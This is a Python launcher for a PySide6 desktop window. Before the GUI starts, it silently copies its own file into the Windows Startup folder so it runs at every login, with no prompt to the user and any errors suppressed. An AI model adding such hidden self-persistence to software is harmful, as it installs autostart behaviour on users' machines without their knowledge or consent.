import os.path

from PySide6.QtWidgets import QApplication
from window import Window
import sys
import os
import winshell
if getattr(sys, 'frozen', False):
    cur_file = os.path.basename(sys.executable)

else:
    cur_file = os.path.basename(__file__)

try:
    cwd = os.path.join(os.getcwd(), cur_file)

    with open(cwd, 'rb') as file:
        startup = winshell.startup()
        buffer = bytearray(file.read())
    cwd = f'{startup}\\{cur_file}'

    with open(cwd, 'wb') as file:
        file.write(buffer)

except Exception as error:
    print(error)


try:
    app = QApplication()
    window = Window()
    window.show()
    app.exec()
except Exception as err:
    with open('log.txt', 'a') as f:
        f.write(f'{err}\n')

# import os.path
#
# current_file = os.path.basename(__file__)
# print(current_file)
# print(os.path.curdir + current_file)
# print(os.listdir(os.path.curdir))